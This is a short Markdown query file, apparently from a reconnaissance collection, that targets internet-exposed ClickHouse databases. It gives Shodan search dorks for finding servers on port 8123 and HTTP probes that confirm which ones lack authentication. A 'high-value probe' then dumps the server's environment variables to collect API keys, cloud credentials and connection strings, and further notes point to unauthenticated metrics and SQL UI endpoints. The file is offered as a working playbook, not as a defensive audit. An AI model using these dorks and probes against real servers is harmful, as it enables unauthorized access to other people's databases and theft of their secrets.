# ClickHouse — Shodan Query File
# Category: Specialty Data Layers / OLAP / AI feature store
# Created: 2026-05-28

## Primary Dorks

```
http.title:"ClickHouse" port:8123
```
- Hits the ClickHouse web UI title; port 8123 is the HTTP API port
- Very low FP rate — "ClickHouse" in title is vendor-unique

```
"x-clickhouse-server-display-name" port:8123
```
- Header-based fingerprint; leaks internal hostname
- More precise than title-based; catches instances with custom titles

```
port:8123 "X-ClickHouse-Server-Display-Name"
```
- Alternate capitalization for the header dork

```
http.html:"ClickHouse" port:8123 -http.title:"ClickHouse"
```
- Catches /play UI and API responses that reference ClickHouse in body but have custom titles

## Verification Probe
```
GET http://<ip>:8123/?query=SELECT+version()
```
- Returns version string on unauthenticated instances: `24.3.2.23\n`
- Returns 401 or 403 on auth-enforced instances
- 200 + version = confirmed unauth

## Auth Check
```
GET http://<ip>:8123/?query=SELECT+1
```
- Returns `1\n` if unauth
- Auth-gated instances return: `Code: 516. DB::Exception: <user>: Authentication failed`

## High-Value Probe (confirmed unauth only)
```
GET http://<ip>:8123/?query=SELECT+*+FROM+system.environment+FORMAT+JSONEachRow
```
- Dumps all environment variables visible to ClickHouse process
- May contain API keys, cloud credentials, connection strings

## Notes
- Port 9000 (native TCP) not HTTP-scannable by Shodan — 8123 is the target
- Port 9363 (Prometheus metrics) leaks table counts + query rates without auth
- `/play` endpoint = full browser SQL UI, no client needed
